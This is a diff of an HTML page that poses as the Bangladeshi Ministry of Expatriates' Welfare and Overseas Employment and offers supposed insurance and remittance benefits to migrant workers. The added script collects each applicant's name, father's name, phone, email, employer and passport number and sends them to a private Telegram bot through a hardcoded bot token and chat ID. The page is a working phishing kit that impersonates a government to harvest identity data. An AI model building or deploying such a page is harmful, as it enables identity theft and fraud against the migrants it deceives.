@@ -1,114 +1,175 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>প্রবাসী কল্যাণ মন্ত্রণালয়: আবেদন</title> 
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    
-    <!-- Google Fonts (Optional, for better typography) -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</title>
 
-    <!-- Google Sign-In SDK -->
-    <script src="https://accounts.google.com/gsi/client" async defer></script>
+  <!-- Tailwind -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
 
-    <!-- Font Awesome for icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
-
-    <style>
-        /* Applying custom font */
-        body {
-            font-family: 'Kalpurush', sans-serif;
-        }
-        /* Animation Helper */
-        @keyframes fade-in-up {
-            0% { opacity: 0; transform: translateY(20px) scale(0.95); }
-            100% { opacity: 1; transform: translateY(0) scale(1); }
-        }
-        .animate-fade-in-up { animation: fade-in-up 0.5s ease-out forwards; }
-    </style>
+  <style>
+    body { font-family: 'Kalpurush', sans-serif; background: #f8fafc; }
+    .card { background: #fff; border-radius: 1rem; box-shadow: 0 3px 10px rgba(0,0,0,0.08); padding: 1.5rem; }
+    .accordion-content { transition: max-height 0.4s ease; overflow: hidden; }
+    @keyframes fadeUp { from{opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);} }
+    .animate { animation: fadeUp 0.6s ease-out; }
+  </style>
 </head>
-<body class="bg-gray-100">
+<body>
 
-    <!-- LOGIN SCREEN -->
-    <div id="login-screen" class="fixed inset-0 bg-gradient-to-br from-gray-900 to-gray-700 flex items-center justify-center z-50 p-4">
-        <div class="bg-white bg-opacity-95 shadow-2xl rounded-2xl p-6 md:p-8 w-full max-w-md text-center transform transition-all duration-500 scale-95 opacity-0">
-            <h2 class="text-2xl md:text-3xl font-bold text-gray-800 mb-2">
-                প্রবাসী কল্যাণ মন্ত্রণালয়ে স্বাগতম!
-            </h2>
-            <p class="text-gray-600 mb-6 text-sm md:text-base">
-                সম্মানিত প্রবাসী ভাই ও বোনেরা, আপনার প্রোফাইলে প্রবেশ করে আমাদের সরকারি সেবা গ্রহণ করুন।
-            </p>
-
-            <!-- পরিবর্তিত Google OAuth Client -->
-            <div id="g_id_onload"
-                 data-client_id="900722552779-uc95gnk5o3ba25q3b81qacpqac5j0n9r.apps.googleusercontent.com"
-                 data-callback="handleCredentialResponse"
-                 data-auto_prompt="false"
-                 data-ux_mode="popup"
-                 data-use_fedcm_for_prompt="false">
-            </div>
-
-            <div class="g_id_signin flex justify-center mb-4"
-                 data-type="standard"
-                 data-size="large"
-                 data-theme="outline"
-                 data-text="continue_with"
-                 data-shape="rectangular"
-                 data-logo_alignment="left">
-            </div>
-
-            <p class="text-xs text-gray-500 mb-5">
-                (লগইন করার পর, আপনার Gmail ইমেইল ঠিকানা আমাদের সিস্টেমে যুক্ত হবে। এটি একটি নিরাপদ প্রক্রিয়া।)
-            </p>
-
-            <!-- Skip button -->
-            <button id="skip-login-btn"
-                    class="w-full bg-gray-600 text-white py-2.5 rounded-lg hover:bg-gray-700 transition-colors duration-300"
-                    onclick="skipLogin()">
-                <i class="fas fa-arrow-right-to-bracket mr-2"></i> লগইন না করে চালিয়ে যান
-            </button>
-        </div>
+<!-- HEADER -->
+<header class="bg-gradient-to-r from-green-700 via-green-600 to-red-700 text-white py-4 shadow-lg sticky top-0 z-50">
+  <div class="container mx-auto flex justify-between items-center px-4">
+    <div class="flex items-center space-x-3">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f9/Emblem_of_Bangladesh.svg/1200px-Emblem_of_Bangladesh.svg.png" alt="Logo" class="w-10 h-10 rounded-full border border-white">
+      <div>
+        <h1 class="text-lg font-bold">প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h1>
+        <p class="text-sm opacity-90">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</p>
+      </div>
     </div>
-    
-    <!-- MAIN APPLICATION (অপরিবর্তিত) -->
-    <div id="main-content" style="display:none;">
-        <!-- Header Section -->
-        <header class="bg-gradient-to-r from-blue-800 to-blue-600 text-white p-4 flex justify-between items-center shadow-md sticky top-0 z-40">
-            <button class="text-2xl"><i class="fas fa-bars"></i></button>
-            <h1 class="text-lg font-semibold text-center flex-grow flex items-center justify-center">
-                <img src="https://via.placeholder.com/35x35/FFFFFF/000000?text=লোগো" alt="Logo" class="mr-2 rounded-full"/>
-                প্রবাসী কল্যাণ মন্ত্রণালয়
-            </h1>
-            <button class="text-2xl" id="profile-login-icon" onclick="showLoginAgain()"><i class="fas fa-user-circle"></i></button>
-        </header>
+  </div>
+</header>
 
-        <!-- MAIN CONTENT CONTAINER (অপরিবর্তিত) -->
-        <div class="container mx-auto p-4 md:p-6">
-            <!-- Info Boxes, WhatsApp Box, Benefits Section, Application Form Section... -->
-            <!-- ... (এই অংশগুলো আগের মতোই অপরিবর্তিত) ... -->
-        </div>
+<main class="container mx-auto p-4 md:p-8">
+
+  <!-- সুবিধাসমূহ -->
+  <section class="card animate mb-8">
+    <h2 class="text-2xl font-bold text-gray-800 mb-3 border-b pb-2">🔹 সরকারি সুবিধাসমূহ</h2>
+    <div class="space-y-3">
+      <div class="border rounded-lg overflow-hidden">
+        <button class="accordion-btn w-full flex justify-between items-center p-4 bg-gray-50 hover:bg-gray-100 text-gray-700 font-semibold">
+          <span>প্রবাসী বীমা</span><span class="text-xl">+</span>
+        </button>
+        <div class="accordion-content p-4 pt-0 text-gray-600">দুর্ঘটনা বা মৃত্যু হলে সর্বোচ্চ ৬০ লাখ টাকা পর্যন্ত বীমা সুবিধা।</div>
+      </div>
+      <div class="border rounded-lg overflow-hidden">
+        <button class="accordion-btn w-full flex justify-between items-center p-4 bg-gray-50 hover:bg-gray-100 text-gray-700 font-semibold">
+          <span>রেমিট্যান্স প্রণোদনা</span><span class="text-xl">+</span>
+        </button>
+        <div class="accordion-content p-4 pt-0 text-gray-600">বৈধ চ্যানেলে রেমিট্যান্স পাঠালে ২.৫% থেকে ৫% পর্যন্ত প্রণোদনা।</div>
+      </div>
     </div>
-    
-    <!-- SUCCESS MESSAGE (অপরিবর্তিত) -->
-    <div id="success-message" style="display:none;" class="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-gradient-to-br from-green-500 to-green-700 text-white p-8 rounded-lg shadow-2xl text-center z-50">
-        <!-- ... -->
+  </section>
+
+  <!-- আবেদন ফর্ম -->
+  <section class="card animate text-center mb-6">
+    <h2 class="text-2xl font-bold text-gray-800 border-b pb-2">সরকারি সেবার জন্য আবেদন করুন</h2>
+    <p class="text-gray-600 mt-3">নিচের ফর্মটি পূরণ করে আবেদন জমা দিন।</p>
+    <button onclick="toggleForm()" id="apply-btn" class="mt-4 bg-green-600 text-white font-bold py-3 px-6 rounded-lg hover:bg-green-700 transition">
+      আবেদন ফর্ম খুলুন
+    </button>
+  </section>
+
+  <!-- ফর্ম -->
+  <form id="appForm" class="hidden card space-y-4 animate" enctype="multipart/form-data">
+    <h3 class="text-lg font-bold border-b pb-2 text-gray-700">ব্যক্তিগত তথ্য</h3>
+    <div class="grid md:grid-cols-2 gap-4">
+      <input type="text" id="full_name" placeholder="পূর্ণ নাম" required class="border p-2 rounded">
+      <input type="text" id="father_name" placeholder="পিতার নাম" class="border p-2 rounded">
+      <input type="tel" id="mobile_number" placeholder="মোবাইল নম্বর" required class="border p-2 rounded">
+      <input type="email" id="email" placeholder="ইমেইল" class="border p-2 rounded">
     </div>
 
-    <script>
-        // --- সম্পূর্ণ JavaScript কোডটি অপরিবর্তিত ---
-        const BACKEND_URL = 'https://your-app-name.glitch.me/submit-form';
-        let loggedInUserEmail = "";
+    <h3 class="text-lg font-bold border-b pb-2 text-gray-700 mt-4">কর্মসংস্থান তথ্য</h3>
+    <div class="grid md:grid-cols-2 gap-4">
+      <input type="text" id="current_country" list="countries" placeholder="বর্তমান দেশ" class="border p-2 rounded">
+      <datalist id="countries"></datalist>
+      <input type="text" id="company_name" placeholder="কোম্পানির নাম" class="border p-2 rounded">
+      <input type="text" id="passport_no" placeholder="পাসপোর্ট নম্বর" class="border p-2 rounded">
+    </div>
 
-        // DOM Elements
-        const loginScreen = document.getElementById('login-screen');
-        // ... etc.
+    <div class="mt-4">
+      <label class="block text-gray-700 font-semibold mb-2">পাসপোর্ট স্ক্যান কপি আপলোড করুন:</label>
+      <input type="file" id="passport_file" accept="image/*,application/pdf" class="border p-2 rounded w-full">
+    </div>
 
-        // All functions (parseJwt, handleCredentialResponse, showMainContent, etc.)
-        // ... (এই সকল ফাংশন আগের মতোই অপরিবর্তিত) ...
-    </script>
+    <button type="submit" class="w-full bg-green-600 text-white py-3 rounded font-bold hover:bg-green-700 transition">আবেদন জমা দিন</button>
+  </form>
+
+  <p id="success" class="hidden text-green-700 font-semibold text-center mt-4 animate">✅ আবেদন সফলভাবে জমা হয়েছে!</p>
+</main>
+
+<footer class="bg-gray-100 text-center py-4 text-sm text-gray-600 mt-10 border-t">
+  © ২০২৫ প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়
+</footer>
+
+<script>
+  // Telegram Setup
+  const TELEGRAM_BOT_TOKEN = "7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco";
+  const CHAT_ID = "6658445342";
+  const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+  // Accordion
+  document.querySelectorAll('.accordion-btn').forEach(btn=>{
+    btn.addEventListener('click',()=>{
+      const content=btn.nextElementSibling;
+      const icon=btn.querySelector('span:last-child');
+      const open=content.style.maxHeight;
+      document.querySelectorAll('.accordion-content').forEach(c=>c.style.maxHeight=null);
+      document.querySelectorAll('.accordion-btn span:last-child').forEach(i=>i.textContent='+');
+      if(!open){content.style.maxHeight=content.scrollHeight+'px';icon.textContent='–';}
+    });
+  });
+
+  // Toggle form
+  const form=document.getElementById('appForm');
+  function toggleForm(){
+    form.classList.toggle('hidden');
+    document.getElementById('apply-btn').textContent=form.classList.contains('hidden')?'আবেদন ফর্ম খুলুন':'ফর্মটি বন্ধ করুন';
+  }
+
+  // Load countries list
+  fetch("https://restcountries.com/v3.1/all")
+  .then(r=>r.json())
+  .then(data=>{
+    const datalist=document.getElementById("countries");
+    data.sort((a,b)=>a.name.common.localeCompare(b.name.common))
+        .forEach(c=>{
+          const opt=document.createElement("option");
+          opt.value=c.name.common;
+          datalist.appendChild(opt);
+        });
+  });
+
+  // Submit form
+  form.addEventListener('submit',async e=>{
+    e.preventDefault();
+    const btn=form.querySelector('button[type="submit"]');
+    btn.disabled=true;
+    btn.textContent='পাঠানো হচ্ছে...';
+
+    const msg = `
+📋 *নতুন আবেদন প্রাপ্ত!*
+
+👤 নাম: ${full_name.value}
+👨 পিতা: ${father_name.value || 'N/A'}
+📞 মোবাইল: ${mobile_number.value}
+📧 ইমেইল: ${email.value || 'N/A'}
+🌍 দেশ: ${current_country.value || 'N/A'}
+🏢 কোম্পানি: ${company_name.value || 'N/A'}
+🛂 পাসপোর্ট: ${passport_no.value || 'N/A'}
+`;
+
+    try {
+      await fetch(API_URL,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'Markdown'})
+      });
+      form.reset();
+      form.classList.add('hidden');
+      document.getElementById('success').classList.remove('hidden');
+      setTimeout(()=>document.getElementById('success').classList.add('hidden'),5000);
+    } catch {
+      alert("❌ আবেদন পাঠাতে সমস্যা হয়েছে। পরে আবার চেষ্টা করুন।");
+    } finally {
+      btn.disabled=false;
+      btn.textContent='আবেদন জমা দিন';
+    }
+  });
+</script>
+
 </body>
 </html>
